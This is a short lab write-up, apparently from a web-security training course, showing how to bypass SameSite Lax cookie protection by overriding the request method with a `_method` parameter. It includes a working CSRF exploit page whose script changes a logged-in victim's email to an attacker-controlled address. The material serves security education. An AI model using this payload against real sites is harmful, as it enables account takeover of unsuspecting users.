## Lab: SameSite Lax bypass via method override

Defense: 
- Change Email request restricts only POST allowed.
- default Session Cookie is Lax

Bypass:
- Send GET reqeust and override request type by argument `_method`
- `document.location=...`

```
<html>
    <body>
        <script>
            document.location = "https://0ad5008204f75d35832c01bb00b40069.web-security-academy.net/my-account/change-email?email=pwned123%40evil-user.net&_method=POST"
        </script>
    </body>
</html>
```


